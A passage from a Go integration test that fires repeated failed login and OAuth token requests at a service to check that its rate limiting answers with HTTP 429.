		r := t.rawJSON(hc, http.MethodPost, "/session/login", map[string]string{"email": "nobody+" + fmt.Sprint(i) + "@nowhere.example", "password": "wrong-password-123"}, s.CSRFToken)
		limited = r.status == http.StatusTooManyRequests
	}
	if !limited {
		t.Errorf("60 failed logins from one IP were never answered with 429")
	}
	limited = false
	for i := 0; i < 120 && !limited; i++ {
		form := url.Values{"grant_type": {"client_credentials"}, "client_id": {"obxc_nobody"}, "client_secret": {"obxs_wrong"}}
		res, err := t.r.doOnce(ctx, http.MethodPost, t.r.cfg.BaseURL+obx.PathAPIBase+"/oauth/token", []byte(form.Encode()), http.Header{"Content-Type": {"application/x-www-form-urlencoded"}})
		t.Check(err, "token")
		limited = res.status == http.StatusTooManyRequests
	}
	if !limited {
		t.Errorf("120 failed token requests from one IP were never answered with 429")
	}
}
